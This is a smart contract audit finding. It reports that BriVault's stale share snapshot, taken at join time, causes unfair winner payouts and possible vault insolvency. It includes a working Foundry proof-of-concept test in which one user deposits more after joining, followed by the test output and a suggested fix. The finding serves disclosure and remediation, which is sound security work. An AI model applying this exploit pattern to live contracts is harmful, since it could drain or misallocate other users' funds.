# Finding Title

Stale `userSharesToCountry` snapshot causes unfair payouts and potential insolvency

## Root + Impact

- Root: `userSharesToCountry[msg.sender][countryId] = participantShares;` is set at join time and never updated. Later deposits increase `balanceOf(msg.sender)` but `totalWinnerShares` sums the stale snapshots.
- Impact: Winners can deposit more after joining to increase actual shares but denominator remains stale. First withdraw can overdraw relative to vault funds or create disproportionate payouts among winners.

## Description

- Normal behavior: Distribution should reflect current shares at the end of event.
- Issue: The denominator `totalWinnerShares` is based on stale values captured at join time and may be much lower than the sum of actual shares. This can lead to overpayment to early withdrawers or revert when attempting large transfers.

```solidity
// BriVault.sol
function joinEvent(uint256 countryId) public {
    uint256 participantShares = balanceOf(msg.sender);
    userSharesToCountry[msg.sender][countryId] = participantShares; // @> stale snapshot
}

function _getWinnerShares () internal returns (uint256) {
    for (uint256 i = 0; i < usersAddress.length; ++i){
        address user = usersAddress[i]; 
        totalWinnerShares += userSharesToCountry[user][winnerCountryId]; // @> sums stale snapshots
    }
}

function withdraw() external winnerSet {
    uint256 shares = balanceOf(msg.sender); // @> uses current shares
    uint256 assetToWithdraw = Math.mulDiv(shares, finalizedVaultAsset, totalWinnerShares);
}
```

## Risk

- Likelihood: High
  - Occurs whenever users deposit after joining.
- Impact: High
  - Unfair distribution (overpayment to those with larger current shares than snapshot).
  - Potential revert or draining of vault if first withdraw exceeds remaining assets.

## Proof of Concept

```solidity
// test/AuditPoC.t.sol::test_poc5_stale_snapshot_causes_unfair_and_potential_revert
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {BriVault} from "../src/briVault.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {MockERC20} from "./MockErc20.t.sol";

contract AuditPoCTest is Test {
    uint256 public participationFeeBsp;
    uint256 public eventStartDate;
    uint256 public eventEndDate;
    address public participationFeeAddress;
    uint256 public minimumAmount;

    BriVault public briVault;
    MockERC20 public mockToken;

    address owner = makeAddr("owner");
    address user1 = makeAddr("user1");
    address user2 = makeAddr("user2");
    address user3 = makeAddr("user3");

    string[48] countries = [
        "United States", "Canada", "Mexico", "Argentina", "Brazil", "Ecuador",
        "Uruguay", "Colombia", "Peru", "Chile", "Japan", "South Korea",
        "Australia", "Iran", "Saudi Arabia", "Qatar", "Uzbekistan", "Jordan",
        "France", "Germany", "Spain", "Portugal", "England", "Netherlands",
        "Italy", "Croatia", "Belgium", "Switzerland", "Denmark", "Poland",
        "Serbia", "Sweden", "Austria", "Morocco", "Senegal", "Nigeria",
        "Cameroon", "Egypt", "South Africa", "Ghana", "Algeria", "Tunisia",
        "Ivory Coast", "New Zealand", "Costa Rica", "Panama", "United Arab Emirates", "Iraq"
    ];

    function setUp() public {
        participationFeeBsp = 150; // 1.5%
        eventStartDate = block.timestamp + 2 days;
        eventEndDate = eventStartDate + 31 days;
        participationFeeAddress = makeAddr("participationFeeAddress");
        minimumAmount = 0.0002 ether;

        mockToken = new MockERC20("Mock Token", "MTK");

        // Mint balances
        mockToken.mint(owner, 100 ether);
        mockToken.mint(user1, 100 ether);
        mockToken.mint(user2, 100 ether);
        mockToken.mint(user3, 100 ether);

        vm.startPrank(owner);
        briVault = new BriVault(
            IERC20(address(mockToken)),
            participationFeeBsp,
            eventStartDate,
            participationFeeAddress,
            minimumAmount,
            eventEndDate
        );
        vm.stopPrank();
    }

    /// PoC-5: Stale winnerShares snapshot lets early joiners deposit more later and overdraw vault
    function test_poc5_stale_snapshot_causes_unfair_and_potential_revert() public {
        vm.prank(owner);
        briVault.setCountry(countries);
        uint256 winnerIdx = 10; // Japan

        // User1 joins with small initial deposit
        vm.startPrank(user1);
        mockToken.approve(address(briVault), type(uint256).max);
        briVault.deposit(1 ether, user1);
        briVault.joinEvent(winnerIdx); // snapshot at ~1 ether shares
        vm.stopPrank();

        // User2 joins with 1 ether
        vm.startPrank(user2);
        mockToken.approve(address(briVault), type(uint256).max);
        briVault.deposit(1 ether, user2);
        briVault.joinEvent(winnerIdx);
        vm.stopPrank();

        // Before event starts, user1 increases deposit significantly
        vm.startPrank(user1);
        briVault.deposit(9 ether, user1); // total ~10 ether shares now
        vm.stopPrank();

        // End event & set winner; totalWinnerShares uses stale snapshots (~1 + 1 ether shares)
        vm.warp(eventEndDate + 1);
        vm.prank(owner);
        briVault.setWinner(winnerIdx);

        uint256 staleTotal = briVault.totalWinnerShares();
        // user1 now has ~10x shares relative to their snapshot
        uint256 user1SharesNow = briVault.balanceOf(user1);
        uint256 user2SharesNow = briVault.balanceOf(user2);
        console.log("staleTotal", staleTotal);
        console.log("u1 now", user1SharesNow);
        console.log("u2 now", user2SharesNow);
        // Assert stale denominator is less than actual sum of current shares
        assertLt(staleTotal, user1SharesNow + user2SharesNow, "stale snapshot smaller than actual shares");

        // First withdraw by user1 should revert due to attempting to overdraw vault
        vm.startPrank(user1);
        vm.expectRevert();
        briVault.withdraw();
        vm.stopPrank();

        // Second withdraw by user2 succeeds but pays disproportionate amount based on stale denominator
        vm.startPrank(user2);
        uint256 before2 = mockToken.balanceOf(user2);
        briVault.withdraw();
        uint256 paid2 = mockToken.balanceOf(user2) - before2;
        vm.stopPrank();

        // Expected payout equals sharesNow * finalizedVaultAsset / staleTotal
        uint256 expectedPaid2 = (user2SharesNow * briVault.finalizedVaultAsset()) / staleTotal;
        assertEq(paid2, expectedPaid2, "payout uses stale denominator");
    }
}
```

**Test result**

```bash
forge test --match-test test_poc5_stale_snapshot_causes_unfair_and_potential_revert -vv


Ran 1 test for test/AuditPoC.t.sol:AuditPoCTest
[PASS] test_poc5_stale_snapshot_causes_unfair_and_potential_revert() (gas: 1967081)
Logs:
  staleTotal 1970000000000000000
  u1 now 9850000000000000000
  u2 now 985000000000000000

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 8.20ms (4.53ms CPU time)
```

## Recommended Mitigation

```diff
- userSharesToCountry[msg.sender][countryId] = participantShares;
 // Either update snapshot on each deposit or compute winner shares live:
 // Option A: Recompute snapshots when setting winner
 // totalWinnerShares = sum(balanceOf(user) for all users that picked winnerCountryId)
 // Option B: Track cumulative shares per user updated on deposit/transfer/burn events.
```

Ensuring `totalWinnerShares` reflects actual end-state balances prevents unfair payouts and insolvency.
